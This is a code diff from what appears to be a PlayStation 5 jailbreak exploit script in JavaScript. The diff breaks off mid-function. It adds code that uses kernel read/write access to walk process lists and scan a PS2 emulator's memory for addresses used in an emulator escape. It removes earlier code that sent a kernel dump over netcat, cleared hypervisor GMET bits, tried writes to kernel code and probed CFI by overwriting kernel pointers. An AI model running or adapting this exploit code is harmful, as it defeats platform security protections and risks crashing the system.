@@ -553,28 +553,202 @@ async function main(userlandRW, wkOnly = false) {
         }
 
         ///////////////////////////////////////////////////////////////////////
-        // KERNEL .TEXT DUMP - For IDA reverse engineering
-        // Placed early to avoid memory pressure from elf_store allocation
+        // PS2EMU MEMORY FINDER - For mast1c0re emulator escape
+        // Searches for critical addresses: N/S status buffers, IOP RAM pointer
         ///////////////////////////////////////////////////////////////////////
 
-        function htons_dump(port) {
-            return ((port & 0xFF) << 8) | (port >>> 8);
-        }
+        // Process structure offsets (FreeBSD kernel)
+        const PROC_P_LIST_NEXT = 0x0;      // LIST_ENTRY(proc) p_list
+        const PROC_P_VMSPACE = 0x200;      // struct vmspace *p_vmspace
+        const PROC_P_COMM = 0x470;         // char p_comm[MAXCOMLEN+1]
+        const PROC_P_PID = 0xC4;           // pid_t p_pid
 
-        function aton(ip) {
-            let chunks = ip.split('.');
-            let addr = 0;
-            for (let i = 0; i < 4; i++) {
-                addr |= (parseInt(chunks[i]) << (i * 8));
+        // VM map entry structure offsets
+        const VM_MAP_ENTRY_NEXT = 0x8;
+        const VM_MAP_ENTRY_START = 0x20;
+        const VM_MAP_ENTRY_END = 0x28;
+        const VM_MAP_ENTRY_PROTECTION = 0x60;
+
+        // Protection flags
+        const VM_PROT_READ = 0x1;
+        const VM_PROT_WRITE = 0x2;
+        const VM_PROT_EXECUTE = 0x4;
+
+        // Read null-terminated string from kernel memory
+        async function kreadString(addr, maxLen = 32) {
+            let str = "";
+            for (let i = 0; i < maxLen; i++) {
+                const byte = await krw.read1(addr.add32(i));
+                if (byte === 0) break;
+                str += String.fromCharCode(byte);
             }
-            return addr >>> 0;
+            return str;
         }
 
-        // CONFIGURE THESE FOR YOUR SETUP
-        const DUMP_NET_ADDR = aton("192.168.1.100");  // Your PC's IP
-        const DUMP_NET_PORT = htons_dump(9020);        // Port for netcat
+        // Find process by name in allproc list
+        async function findProcessByName(allprocAddr, targetName) {
+            await log(`Searching for process: ${targetName}`, LogLevel.INFO);
+            let proc = await krw.read8(allprocAddr);
+            let found = [];
 
-        // Log kernel base addresses first
+            for (let i = 0; i < 500; i++) {
+                if (proc.low === 0 && proc.hi === 0) break;
+                try {
+                    const name = await kreadString(proc.add32(PROC_P_COMM));
+                    const pid = await krw.read4(proc.add32(PROC_P_PID));
+                    if (name.toLowerCase().includes(targetName.toLowerCase())) {
+                        await log(`Found: ${name} (PID: ${pid}) @ ${proc.toString()}`, LogLevel.SUCCESS);
+                        found.push({ proc, name, pid });
+                    }
+                    proc = await krw.read8(proc.add32(PROC_P_LIST_NEXT));
+                } catch (e) {
+                    break;
+                }
+            }
+            return found;
+        }
+
+        // Dump memory mappings for a process
+        async function dumpProcessMemoryMap(procAddr) {
+            const vmspace = await krw.read8(procAddr.add32(PROC_P_VMSPACE));
+            await log(`vmspace @ ${vmspace.toString()}`, LogLevel.INFO);
+
+            const mapHeader = vmspace;
+            const firstEntry = await krw.read8(mapHeader.add32(VM_MAP_ENTRY_NEXT));
+            let entry = firstEntry;
+            let mappings = [];
+
+            for (let i = 0; i < 1000; i++) {
+                if (entry.low === 0 && entry.hi === 0) break;
+                if (entry.eq(mapHeader)) break;
+
+                try {
+                    const start = await krw.read8(entry.add32(VM_MAP_ENTRY_START));
+                    const end = await krw.read8(entry.add32(VM_MAP_ENTRY_END));
+                    const prot = await krw.read4(entry.add32(VM_MAP_ENTRY_PROTECTION));
+                    const size = end.sub64(start);
+                    const protStr =
+                        ((prot & VM_PROT_READ) ? 'R' : '-') +
+                        ((prot & VM_PROT_WRITE) ? 'W' : '-') +
+                        ((prot & VM_PROT_EXECUTE) ? 'X' : '-');
+
+                    mappings.push({ start, end, size, prot: protStr, protRaw: prot });
+                    entry = await krw.read8(entry.add32(VM_MAP_ENTRY_NEXT));
+                } catch (e) {
+                    break;
+                }
+            }
+            return mappings;
+        }
+
+        // Search for IOP RAM pointer (0x9000000000 value)
+        async function findIopRamPointer(mappings) {
+            await log("=== Searching for IOP RAM Pointer (0x9000000000) ===", LogLevel.INFO);
+            let candidates = [];
+
+            for (const m of mappings) {
+                if (!m.prot.includes('W') || m.prot.includes('X')) continue;
+                const size = m.size.low;
+                if (m.size.hi > 0 || size > 0x2000000) continue;
+                if (size < 0x1000) continue;
+
+                await log(`Scanning ${m.start.toString()} (${(size/1024).toFixed(0)}KB)...`, LogLevel.DEBUG | LogLevel.FLAG_TEMP);
+
+                for (let offset = 0; offset < size; offset += 8) {
+                    try {
+                        const value = await krw.read8(m.start.add32(offset));
+                        if (value.hi === 0x00000090 && value.low === 0x00000000) {
+                            const addr = m.start.add32(offset);
+                            await log(`EXACT IOP RAM PTR @ ${addr.toString()}: ${value.toString()}`, LogLevel.SUCCESS);
+                            candidates.push({ addr, value, regionStart: m.start, offsetInRegion: offset });
+                        }
+                    } catch (e) { }
+                }
+            }
+
+            if (candidates.length > 0) {
+                await log(`\n=== Found ${candidates.length} IOP RAM Pointer Candidate(s) ===`, LogLevel.SUCCESS);
+                for (const c of candidates) {
+                    const N_TO_IOP_OFFSET = 0x25F628;
+                    const estimatedNBuffer = c.addr.sub32(N_TO_IOP_OFFSET);
+                    await log(`  IOP PTR: ${c.addr.toString()}`, LogLevel.INFO);
+                    await log(`  Estimated N_STATUS_BUFFER: ${estimatedNBuffer.toString()}`, LogLevel.INFO);
+                    await log(`  Estimated S_STATUS_BUFFER: ${estimatedNBuffer.add32(0x10).toString()}`, LogLevel.INFO);
+                }
+            }
+            return candidates;
+        }
+
+        // List all processes
+        async function listAllProcesses() {
+            const allprocAddr = krw.kdataBase.add32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA);
+            let proc = await krw.read8(allprocAddr);
+            await log("=== All Processes ===", LogLevel.INFO);
+
+            for (let i = 0; i < 200; i++) {
+                if (proc.low === 0 && proc.hi === 0) break;
+                try {
+                    const name = await kreadString(proc.add32(PROC_P_COMM));
+                    const pid = await krw.read4(proc.add32(PROC_P_PID));
+                    await log(`  [${pid}] ${name}`, LogLevel.DEBUG);
+                    proc = await krw.read8(proc.add32(PROC_P_LIST_NEXT));
+                } catch (e) {
+                    break;
+                }
+            }
+        }
+
+        // Main mast1c0re address finder
+        async function findMast1coreAddresses() {
+            await log("=== PS2 Emulator Memory Analysis ===", LogLevel.INFO);
+            await log("Looking for mast1c0re-critical addresses...", LogLevel.INFO);
+
+            const searchTerms = ["ps2", "emu", "eboot", "racer"];
+            let allProcesses = [];
+
+            for (const term of searchTerms) {
+                const procs = await findProcessByName(
+                    krw.kdataBase.add32(OFFSET_KERNEL_ALLPROC - OFFSET_KERNEL_DATA),
+                    term
+                );
+                allProcesses = allProcesses.concat(procs);
+            }
+
+            if (allProcesses.length === 0) {
+                await log("No ps2emu found, listing all processes...", LogLevel.WARN);
+                await listAllProcesses();
+                return;
+            }
+
+            for (const p of allProcesses) {
+                await log(`\n=== Analyzing: ${p.name} (PID: ${p.pid}) ===`, LogLevel.INFO);
+                const mappings = await dumpProcessMemoryMap(p.proc);
+                await log(`Found ${mappings.length} memory mappings`, LogLevel.INFO);
+
+                // Analyze mappings
+                let executable = [], writable = [], iopCandidates = [], ebootCandidates = [];
+                for (const m of mappings) {
+                    if (m.prot.includes('X')) executable.push(m);
+                    if (m.prot.includes('W') && !m.prot.includes('X')) writable.push(m);
+                    if (m.start.hi >= 0x90 && m.start.hi <= 0x91) {
+                        iopCandidates.push(m);
+                        await log(`IOP CANDIDATE: ${m.start.toString()} - ${m.end.toString()} [${m.prot}]`, LogLevel.SUCCESS);
+                    }
+                    if (m.start.hi === 0 && m.start.low < 0x10000000 && m.prot.includes('X')) {
+                        ebootCandidates.push(m);
+                        await log(`EBOOT CANDIDATE: ${m.start.toString()} - ${m.end.toString()} [${m.prot}]`, LogLevel.SUCCESS);
+                    }
+                }
+
+                await log(`Executable: ${executable.length}, Writable: ${writable.length}`, LogLevel.INFO);
+                await log(`IOP candidates: ${iopCandidates.length}, Eboot candidates: ${ebootCandidates.length}`, LogLevel.INFO);
+
+                // Search for IOP pointer
+                await findIopRamPointer(writable);
+            }
+        }
+
+        // Log kernel base addresses
         await log("[INFO] ktextBase: " + krw.ktextBase, LogLevel.WARN);
         await log("[INFO] kdataBase: " + krw.kdataBase, LogLevel.WARN);
 
@@ -582,658 +756,15 @@ async function main(userlandRW, wkOnly = false) {
         let testVal = await krw.read8(krw.kdataBase);
         await log("[INFO] Test read from kdataBase: " + testVal, LogLevel.INFO);
 
-        ///////////////////////////////////////////////////////////////////////
-        // GMET/VMCB ANALYSIS - Search for hypervisor control data
-        // Based on offsets found in kernel_data.bin analysis:
-        //   - GMET format string at offset 0x3A3CCC
-        //   - SVM feature table at offset 0x330BB0
-        //   - GMET is bit 18 (0x12) in SVM features
-        ///////////////////////////////////////////////////////////////////////
-
-        // Known offsets from kernel_data.bin (relative to kdataBase)
-        const KDATA_OFFSET_GMET_STRING = 0x3A3CCC;      // "EnableGMET:%d" format string
-        const KDATA_OFFSET_SVM_FEATURE_TABLE = 0x330BB0; // SVM feature name table
-        const KDATA_OFFSET_VM_PMAP = 0x409132;          // vm.pmap.pcid_enabled sysctl
+        // =========================================================================
+        // PS2EMU MEMORY FINDER (optional - for mast1c0re research)
+        // Uncomment to find emulator addresses when Star Wars Racer is running
+        // =========================================================================
+        // await findMast1coreAddresses();
 
         // =========================================================================
-        // WRITABLE POINTER EXPLOIT RESEARCH
-        //
-        // CONFIRMED FINDINGS:
-        // - Writable region: kdataBase + 0x0 to ~0xF000 (~60KB)
-        // - Write-protected: 0x10000+ (apic_ops, sysentvec, etc.)
-        // - Writable kernel pointer found at: kdataBase + 0x4a48
-        // - Pointer value: ~ktextBase + 0x13b000
+        // JAILBREAK - Security flags, credentials, sandbox escape
         // =========================================================================
-        {
-            await log("========== WRITABLE POINTER EXPLOIT ==========", LogLevel.SUCCESS);
-            await log("[INFO] Writable region: kdataBase + 0x0 to ~0xF000", LogLevel.INFO);
-            await log("[INFO] ktextBase: " + krw.ktextBase, LogLevel.INFO);
-            await log("[INFO] kdataBase: " + krw.kdataBase, LogLevel.INFO);
-
-            // Dump context around 0x4a48 to understand structure
-            await log("[CONTEXT] Dumping 0x4a00 - 0x4b00:", LogLevel.WARN);
-            for (let off = 0x4a00; off < 0x4b00; off += 0x10) {
-                let v1 = await krw.read8(krw.kdataBase.add32(off));
-                let v2 = await krw.read8(krw.kdataBase.add32(off + 8));
-                let marker = (off === 0x4a40) ? " <-- 0x4a48 here" : "";
-                await log("  0x" + off.toString(16) + ": " + v1 + " | " + v2 + marker, LogLevel.INFO);
-            }
-
-            // Read the writable pointer at 0x4a48
-            let ptr4a48 = await krw.read8(krw.kdataBase.add32(0x4a48));
-            let ptrOffset = ptr4a48.low - krw.ktextBase.low;
-
-            await log("[0x4a48] Pointer value: " + ptr4a48, LogLevel.SUCCESS);
-            await log("[0x4a48] Points to: ktextBase + 0x" + ptrOffset.toString(16), LogLevel.INFO);
-            await log("[0x4a48] Target contains ZEROS - not a function pointer", LogLevel.WARN);
-
-            // Since 0x4a48 points to zeros, look for OTHER interesting data
-            await log("[SCAN] Looking for ALL kernel pointers in writable region...", LogLevel.WARN);
-
-            let allPointers = [];
-            for (let off = 0; off < 0x10000; off += 8) {
-                let val = await krw.read8(krw.kdataBase.add32(off));
-
-                // Check if it's a kernel pointer (high bits set)
-                if (val.hi === 0xffffffff && val.low !== 0xffffffff) {
-                    // Filter out obvious masks
-                    let lowHex = val.low.toString(16).padStart(8, '0');
-                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;
-
-                    allPointers.push({ offset: off, value: val });
-                }
-            }
-
-            await log("[SCAN] Found " + allPointers.length + " kernel pointers total", LogLevel.SUCCESS);
-
-            // Categorize pointers
-            for (let ptr of allPointers) {
-                let textOff = ptr.value.low - krw.ktextBase.low;
-                let dataOff = ptr.value.low - krw.kdataBase.low;
-
-                let category = "";
-                if (textOff >= 0 && textOff < 0x2000000) {
-                    category = "-> .text + 0x" + textOff.toString(16);
-                } else if (dataOff >= 0 && dataOff < 0x2000000) {
-                    category = "-> .data + 0x" + dataOff.toString(16);
-                } else {
-                    category = "(other region)";
-                }
-
-                await log("[PTR] 0x" + ptr.offset.toString(16) + ": " + ptr.value + " " + category, LogLevel.INFO);
-            }
-
-            // =========================================================================
-            // SVM CACHE ANALYSIS - Check multiple potential offsets
-            // =========================================================================
-
-            await log("========== SVM CACHE ANALYSIS ==========", LogLevel.SUCCESS);
-
-            // Check both potential SVM cache locations
-            const SVM_OFFSETS = [0x4bf0, 0x4dcc];
-            let svmLocations = [];
-
-            for (let offset of SVM_OFFSETS) {
-                let val = await krw.read4(krw.kdataBase.add32(offset));
-                let hasGmet = (val & 0x40000) !== 0;
-                await log("[SVM] 0x" + offset.toString(16) + ": 0x" + val.toString(16) +
-                    (val === 0x740f12 ? " <- GMET SET" : (val === 0x700f12 ? " <- GMET CLEAR" : "")),
-                    hasGmet ? LogLevel.WARN : LogLevel.SUCCESS);
-                if (val === 0x740f12 || val === 0x700f12) {
-                    svmLocations.push({ offset, val, hasGmet });
-                }
-            }
-
-            // Scan for 0x740f12 pattern in writable region
-            await log("[SCAN] Searching for SVM cache value 0x740f12 in 0x0-0x10000...", LogLevel.INFO);
-            let svmMatches = [];
-            for (let off = 0; off < 0x10000; off += 4) {
-                let val = await krw.read4(krw.kdataBase.add32(off));
-                if (val === 0x740f12 || val === 0x700f12) {
-                    svmMatches.push({ offset: off, val });
-                    await log("[SCAN] Found at 0x" + off.toString(16) + ": 0x" + val.toString(16), LogLevel.SUCCESS);
-                }
-            }
-            await log("[SCAN] Found " + svmMatches.length + " SVM cache matches", LogLevel.INFO);
-
-            // =========================================================================
-            // MANUFACTURING MODE SEARCH
-            // =========================================================================
-
-            await log("========== MANUFACTURING MODE SEARCH ==========", LogLevel.SUCCESS);
-
-            // Look for potential manumode flags (small integers 0-3 that could be mode flags)
-            // Known offsets from kernel_data.bin analysis might differ in live memory
-            // Search for characteristic patterns
-
-            // Dump the region around where manumode might be (based on string offsets)
-            // In kernel_data.bin: manumode at 0x43bf5b, curr_manumode at 0x428c67
-            // These are string offsets, not data offsets - need to find actual flag
-
-            await log("[MANU] Searching for mode flags in writable region...", LogLevel.INFO);
-
-            // Look for small values that could be mode flags near interesting offsets
-            let manuCandidates = [];
-            for (let off = 0; off < 0x1000; off += 4) {
-                let val = await krw.read4(krw.kdataBase.add32(off));
-                // Look for values 0, 1, 2, 3 which are typical mode flags
-                if (val >= 0 && val <= 3) {
-                    manuCandidates.push({ offset: off, val });
-                }
-            }
-            await log("[MANU] Found " + manuCandidates.length + " potential mode flags in first 0x1000", LogLevel.INFO);
-
-            // =========================================================================
-            // GMET BYPASS TEST MENU
-            // =========================================================================
-
-            let testChoice = confirm(
-                "HYPERVISOR BYPASS TESTS\n\n" +
-                "SVM cache matches: " + svmMatches.length + "\n" +
-                "Mode flag candidates: " + manuCandidates.length + "\n\n" +
-                "OK = Run GMET clear test on all SVM locations\n" +
-                "Cancel = Skip to next section"
-            );
-
-            if (testChoice && svmMatches.length > 0) {
-                await log("[TEST] Clearing GMET bit at all SVM cache locations...", LogLevel.WARN);
-
-                for (let match of svmMatches) {
-                    if (match.val === 0x740f12) {
-                        let newVal = match.val & ~0x40000; // Clear bit 18
-                        await log("[TEST] 0x" + match.offset.toString(16) + ": 0x740f12 -> 0x" + newVal.toString(16), LogLevel.WARN);
-                        await krw.write4(krw.kdataBase.add32(match.offset), newVal);
-
-                        let verify = await krw.read4(krw.kdataBase.add32(match.offset));
-                        await log("[TEST] Verify: 0x" + verify.toString(16), LogLevel.INFO);
-                    }
-                }
-
-                await log("[TEST] All SVM caches modified!", LogLevel.SUCCESS);
-                await log("[TEST] Put PS5 to REST MODE, wake, run exploit again", LogLevel.WARN);
-
-                // Check if any location already has GMET clear
-                let anyCleared = svmMatches.some(m => m.val === 0x700f12);
-                if (anyCleared) {
-                    let tryWrite = confirm(
-                        "GMET ALREADY CLEAR!\n\n" +
-                        "At least one SVM cache has GMET bit cleared.\n" +
-                        "Try writing to kernel .text?\n\n" +
-                        "OK = Test .text write\n" +
-                        "Cancel = Skip"
-                    );
-
-                    if (tryWrite) {
-                        await log("[.TEXT] Reading byte from ktextBase...", LogLevel.WARN);
-                        let textByte = await krw.read1(krw.ktextBase);
-                        await log("[.TEXT] Read: 0x" + textByte.toString(16), LogLevel.INFO);
-
-                        await log("[.TEXT] Writing same byte back...", LogLevel.WARN);
-                        try {
-                            await krw.write1(krw.ktextBase, textByte);
-                            await log("[.TEXT] WRITE SUCCEEDED! GMET/NPT BYPASSED!", LogLevel.SUCCESS);
-                        } catch (e) {
-                            await log("[.TEXT] Write failed (expected if HV ignores cache): " + e, LogLevel.ERROR);
-                        }
-                    }
-                }
-            }
-
-            // =========================================================================
-            // MANUFACTURING MODE TEST
-            // =========================================================================
-
-            let manuTest = confirm(
-                "MANUFACTURING MODE TEST\n\n" +
-                "Try setting mode flags to enable manu mode?\n" +
-                "This will try writing value 1 to potential\n" +
-                "mode flag locations in writable memory.\n\n" +
-                "WARNING: May cause instability!\n\n" +
-                "OK = Try manu mode flags\n" +
-                "Cancel = Skip"
-            );
-
-            if (manuTest) {
-                await log("[MANU] Attempting to set manufacturing mode flags...", LogLevel.WARN);
-
-                // Try some specific offsets that might be mode flags
-                // These are speculative based on typical kernel data layout
-                const MANU_TEST_OFFSETS = [0x0, 0x4, 0x8, 0x10, 0x100, 0x200];
-
-                for (let off of MANU_TEST_OFFSETS) {
-                    let oldVal = await krw.read4(krw.kdataBase.add32(off));
-                    await log("[MANU] 0x" + off.toString(16) + " current: " + oldVal, LogLevel.INFO);
-                }
-
-                // Don't actually write without more research - too risky
-                await log("[MANU] Skipping writes - need more research on flag locations", LogLevel.WARN);
-                await log("[MANU] Use kernel dump to find actual manumode variable offset", LogLevel.INFO);
-            }
-
-            // =========================================================================
-            // .TEXT WRITE TEST (direct attempt)
-            // =========================================================================
-
-            let directTextTest = confirm(
-                "DIRECT .TEXT WRITE TEST\n\n" +
-                "Try writing to kernel .text directly?\n" +
-                "(Will likely crash if GMET/NPT active)\n\n" +
-                "OK = Try .text write\n" +
-                "Cancel = Skip"
-            );
-
-            if (directTextTest) {
-                await log("[.TEXT] Direct write test...", LogLevel.WARN);
-                let textByte = await krw.read1(krw.ktextBase);
-                await log("[.TEXT] Read ktextBase[0]: 0x" + textByte.toString(16), LogLevel.INFO);
-
-                try {
-                    await krw.write1(krw.ktextBase, textByte);
-                    await log("[.TEXT] WRITE SUCCEEDED! HV BYPASSED!", LogLevel.SUCCESS);
-                    alert("SUCCESS! Kernel .text is now writable!");
-                } catch (e) {
-                    await log("[.TEXT] Write failed: " + e, LogLevel.ERROR);
-                }
-            }
-
-            // =========================================================================
-            // RESEARCH ANALYSIS SUITE
-            // Comprehensive analysis for HV bypass research
-            // =========================================================================
-
-            let runResearch = confirm(
-                "HV BYPASS RESEARCH SUITE\n\n" +
-                "Run comprehensive analysis?\n" +
-                "- Dump calibration (verify offsets)\n" +
-                "- Full pointer map (0x0-0x10000)\n" +
-                "- Extended SVM cache scan\n" +
-                "- Mystery flag analysis\n" +
-                "- .text read attempt\n\n" +
-                "OK = Run analysis\n" +
-                "Cancel = Skip"
-            );
-
-            if (runResearch) {
-                // ===== CALIBRATION =====
-                await log("========== DUMP CALIBRATION ==========", LogLevel.SUCCESS);
-                await log("kdataBase: " + krw.kdataBase, LogLevel.INFO);
-                await log("ktextBase: " + krw.ktextBase, LogLevel.INFO);
-
-                let cal_svm1 = await krw.read4(krw.kdataBase.add32(0x4bf0));
-                let cal_svm2 = await krw.read4(krw.kdataBase.add32(0x4dcc));
-                let cal_ptr = await krw.read8(krw.kdataBase.add32(0x4a48));
-
-                await log("Calibration values (search in kernel_data.bin):", LogLevel.WARN);
-                await log("  0x4bf0: 0x" + cal_svm1.toString(16) + " (SVM cache 1)", LogLevel.INFO);
-                await log("  0x4dcc: 0x" + cal_svm2.toString(16) + " (SVM cache 2)", LogLevel.INFO);
-                await log("  0x4a48: " + cal_ptr + " (writable pointer)", LogLevel.INFO);
-
-                // ===== FULL POINTER MAP =====
-                await log("========== FULL POINTER MAP (0x0-0x10000) ==========", LogLevel.SUCCESS);
-
-                let textPtrs = [];
-                let dataPtrs = [];
-                let otherPtrs = [];
-
-                for (let off = 0; off < 0x10000; off += 8) {
-                    let val = await krw.read8(krw.kdataBase.add32(off));
-
-                    if (val.hi !== 0xffffffff) continue;
-
-                    // Filter out obvious masks
-                    let lowHex = val.low.toString(16).padStart(8, '0');
-                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;
-
-                    let textOff = val.low - krw.ktextBase.low;
-                    let dataOff = val.low - krw.kdataBase.low;
-
-                    if (textOff >= 0 && textOff < 0x2000000) {
-                        textPtrs.push({off, textOff, val});
-                    } else if (dataOff >= 0 && dataOff < 0x2000000) {
-                        dataPtrs.push({off, dataOff, val});
-                    } else {
-                        otherPtrs.push({off, val});
-                    }
-                }
-
-                await log("Found " + textPtrs.length + " .text pointers", LogLevel.SUCCESS);
-                await log("Found " + dataPtrs.length + " .data pointers", LogLevel.INFO);
-                await log("Found " + otherPtrs.length + " other pointers", LogLevel.INFO);
-
-                // Log .text pointers (most interesting)
-                await log("--- .text pointers (potential code refs) ---", LogLevel.WARN);
-                for (let p of textPtrs) {
-                    await log("  0x" + p.off.toString(16) + " -> .text+0x" + p.textOff.toString(16), LogLevel.WARN);
-                }
-
-                // ===== EXTENDED SVM CACHE SCAN =====
-                await log("========== EXTENDED SVM CACHE SCAN ==========", LogLevel.SUCCESS);
-                let svmMatches = [];
-                for (let off = 0; off < 0x20000; off += 4) {
-                    let val = await krw.read4(krw.kdataBase.add32(off));
-                    if (val === 0x740f12 || val === 0x700f12) {
-                        svmMatches.push({off, val});
-                        let gmet = (val & 0x40000) !== 0;
-                        await log("[SVM] 0x" + off.toString(16) + ": 0x" + val.toString(16) +
-                            " (GMET " + (gmet ? "SET" : "CLEAR") + ")", LogLevel.SUCCESS);
-                    }
-                }
-                await log("Total SVM cache matches: " + svmMatches.length, LogLevel.INFO);
-
-                // ===== MYSTERY FLAG ANALYSIS =====
-                await log("========== MYSTERY FLAG ANALYSIS ==========", LogLevel.SUCCESS);
-                const MYSTERY_OFFSET = 0xD11D08;
-
-                // Check if offset is readable (might be outside our dump range)
-                try {
-                    let mysteryVal = await krw.read4(krw.kdataBase.add32(MYSTERY_OFFSET));
-                    await log("Mystery flag at 0xD11D08: 0x" + mysteryVal.toString(16), LogLevel.WARN);
-
-                    // Read surrounding context
-                    await log("Context around 0xD11D00:", LogLevel.INFO);
-                    for (let ctx = 0xD11D00; ctx < 0xD11D20; ctx += 4) {
-                        let ctxVal = await krw.read4(krw.kdataBase.add32(ctx));
-                        let marker = (ctx === MYSTERY_OFFSET) ? " <-- MYSTERY FLAG" : "";
-                        await log("  0x" + ctx.toString(16) + ": 0x" + ctxVal.toString(16) + marker, LogLevel.INFO);
-                    }
-                } catch (e) {
-                    await log("Mystery flag offset 0xD11D08 not accessible: " + e, LogLevel.ERROR);
-                }
-
-                // ===== .TEXT READ ATTEMPT =====
-                await log("========== .TEXT READ ATTEMPT ==========", LogLevel.SUCCESS);
-                try {
-                    let textVal = await krw.read8(krw.ktextBase);
-                    await log("[!!!] .TEXT IS READABLE: " + textVal, LogLevel.SUCCESS);
-                    await log("[!!!] This means we can dump kernel .text!", LogLevel.SUCCESS);
-
-                    let dumpText = confirm(
-                        ".TEXT IS READABLE!\n\n" +
-                        "This is unexpected - GMET should block this.\n" +
-                        "We can dump the kernel .text section!\n\n" +
-                        "Dump first 0x100 bytes to log?\n" +
-                        "OK = Dump sample\n" +
-                        "Cancel = Skip"
-                    );
-
-                    if (dumpText) {
-                        await log("Dumping first 0x100 bytes of .text:", LogLevel.WARN);
-                        for (let toff = 0; toff < 0x100; toff += 8) {
-                            let tval = await krw.read8(krw.ktextBase.add32(toff));
-                            await log("  .text+0x" + toff.toString(16) + ": " + tval, LogLevel.INFO);
-                        }
-                    }
-                } catch (e) {
-                    await log("[.TEXT] Not readable (GMET active): " + e, LogLevel.INFO);
-                    await log("[.TEXT] This is expected - need to extract kernel from firmware", LogLevel.INFO);
-                }
-
-                // ===== SUMMARY =====
-                await log("========== RESEARCH SUMMARY ==========", LogLevel.SUCCESS);
-                await log("kdataBase: " + krw.kdataBase, LogLevel.INFO);
-                await log("ktextBase: " + krw.ktextBase, LogLevel.INFO);
-                await log(".text pointers in writable region: " + textPtrs.length, LogLevel.INFO);
-                await log("SVM cache locations found: " + svmMatches.length, LogLevel.INFO);
-                await log("", LogLevel.INFO);
-                await log("Next steps:", LogLevel.WARN);
-                await log("1. Extract kernel from 4.03 PUP using bootrom", LogLevel.INFO);
-                await log("2. Load into IDA, find code referencing 0xD11D08", LogLevel.INFO);
-                await log("3. Find manumode variable location", LogLevel.INFO);
-                await log("4. Trace dmem_resume_svm function", LogLevel.INFO);
-            }
-
-            // =========================================================================
-            // CFI WRITABLE POINTER PROBE TEST
-            // For each .text pointer in writable region, try writing to it
-            // If no crash -> CFI-exempt pointer found!
-            // If crash -> CFI protected
-            // =========================================================================
-
-            let runCfiProbe = confirm(
-                "CFI WRITABLE POINTER PROBE\n\n" +
-                "This test will attempt to WRITE to each .text\n" +
-                "pointer found in the writable region.\n\n" +
-                "CFI should crash on bad writes, but if we find\n" +
-                "a CFI-exempt pointer, it could be exploited!\n\n" +
-                "WARNING: May crash the system!\n\n" +
-                "OK = Run CFI probe test\n" +
-                "Cancel = Skip"
-            );
-
-            if (runCfiProbe) {
-                await log("========== CFI WRITABLE POINTER PROBE ==========", LogLevel.SUCCESS);
-
-                // First, collect all .text pointers in writable region
-                await log("[CFI] Scanning for .text pointers in 0x0-0xF000...", LogLevel.INFO);
-
-                let textPointers = [];
-                for (let off = 0; off < 0xF000; off += 8) {
-                    let val = await krw.read8(krw.kdataBase.add32(off));
-
-                    if (val.hi !== 0xffffffff) continue;
-
-                    // Filter out obvious masks/invalid
-                    let lowHex = val.low.toString(16).padStart(8, '0');
-                    if (lowHex.match(/^f{5,}/) || lowHex.match(/0{5,}$/)) continue;
-
-                    let textOff = val.low - krw.ktextBase.low;
-                    if (textOff >= 0 && textOff < 0x2000000) {
-                        textPointers.push({ offset: off, value: val, textOffset: textOff });
-                    }
-                }
-
-                await log("[CFI] Found " + textPointers.length + " .text pointers", LogLevel.SUCCESS);
-
-                if (textPointers.length === 0) {
-                    await log("[CFI] No .text pointers found in writable region", LogLevel.WARN);
-                } else {
-                    // Show found pointers
-                    for (let ptr of textPointers) {
-                        await log("[CFI] 0x" + ptr.offset.toString(16) + " -> .text+0x" + ptr.textOffset.toString(16), LogLevel.INFO);
-                    }
-
-                    // Calculate a "safe" target address - just use a different .text offset
-                    // We'll try swapping pointers or writing a nearby .text address
-                    let safeTextTarget = krw.ktextBase.add32(0x100); // First instruction area
-
-                    let testWrite = confirm(
-                        "Found " + textPointers.length + " .text pointers!\n\n" +
-                        "Test writing to them?\n" +
-                        "Will try writing valid .text addr to each.\n\n" +
-                        "If any succeeds without crash -> CFI bypass!\n\n" +
-                        "OK = Start CFI write tests\n" +
-                        "Cancel = Skip"
-                    );
-
-                    if (testWrite) {
-                        await log("[CFI] Starting write tests...", LogLevel.WARN);
-                        await log("[CFI] Target value: " + safeTextTarget + " (.text+0x100)", LogLevel.INFO);
-
-                        let successCount = 0;
-                        let failCount = 0;
-
-                        for (let i = 0; i < textPointers.length; i++) {
-                            let ptr = textPointers[i];
-                            let origVal = ptr.value;
-
-                            await log("[CFI] Testing offset 0x" + ptr.offset.toString(16) + "...", LogLevel.INFO | LogLevel.FLAG_TEMP);
-
-                            try {
-                                // Try writing a different valid .text address
-                                await krw.write8(krw.kdataBase.add32(ptr.offset), safeTextTarget);
-
-                                // If we get here, write succeeded!
-                                let verify = await krw.read8(krw.kdataBase.add32(ptr.offset));
-
-                                if (verify.low === safeTextTarget.low && verify.hi === safeTextTarget.hi) {
-                                    successCount++;
-                                    await log("[CFI] SUCCESS! 0x" + ptr.offset.toString(16) + " is CFI-EXEMPT!", LogLevel.SUCCESS);
-
-                                    // Restore original value
-                                    await krw.write8(krw.kdataBase.add32(ptr.offset), origVal);
-                                    await log("[CFI] Restored original value", LogLevel.INFO);
-                                } else {
-                                    await log("[CFI] Write didn't stick at 0x" + ptr.offset.toString(16), LogLevel.WARN);
-                                    failCount++;
-                                }
-                            } catch (e) {
-                                failCount++;
-                                await log("[CFI] Crash/error at 0x" + ptr.offset.toString(16) + ": " + e, LogLevel.ERROR);
-                                // If we get here after a crash, CFI blocked it
-                            }
-                        }
-
-                        await log("========== CFI PROBE RESULTS ==========", LogLevel.SUCCESS);
-                        await log("[CFI] Total .text pointers tested: " + textPointers.length, LogLevel.INFO);
-                        await log("[CFI] Successful writes (CFI-exempt): " + successCount, LogLevel.SUCCESS);
-                        await log("[CFI] Failed writes (CFI protected): " + failCount, LogLevel.INFO);
-
-                        if (successCount > 0) {
-                            await log("[!!!] CFI-EXEMPT POINTERS FOUND!", LogLevel.SUCCESS);
-                            await log("[!!!] These can potentially be hijacked!", LogLevel.SUCCESS);
-                            alert("CFI-EXEMPT POINTERS FOUND!\n\nCheck the log for details.");
-                        } else {
-                            await log("[CFI] All pointers appear CFI-protected", LogLevel.WARN);
-                        }
-                    }
-                }
-            }
-
-            // =========================================================================
-            // INITIALIZATION RACE TEST
-            // Modify a pointer before rest mode to test timing window
-            // HV may not have CFI fully active during early resume
-            // =========================================================================
-
-            let runRaceTest = confirm(
-                "INITIALIZATION RACE TEST\n\n" +
-                "This tests if CFI has a timing window\n" +
-                "during suspend/resume where writes work.\n\n" +
